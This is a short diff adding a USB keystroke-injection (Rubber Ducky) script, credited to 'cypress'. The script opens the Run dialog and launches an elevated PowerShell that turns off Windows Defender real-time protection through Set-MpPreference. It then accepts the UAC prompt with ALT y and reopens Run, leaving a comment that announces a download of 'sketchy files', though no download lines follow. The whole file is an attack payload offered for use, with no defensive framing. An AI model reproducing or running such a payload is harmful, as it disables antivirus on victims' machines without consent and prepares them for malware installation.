@@ -1,0 +1,14 @@
+REM made by cypress
+DELAY 2000
+GUI r
+DELAY 200
+REM Open's powershell and disables Windows Defender
+STRING powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+ENTER 
+DELAY 400
+DELAY 300
+ALT y 
+DELAY 500
+GUI r
+DELAY 600
+REM Download sketchy files below..
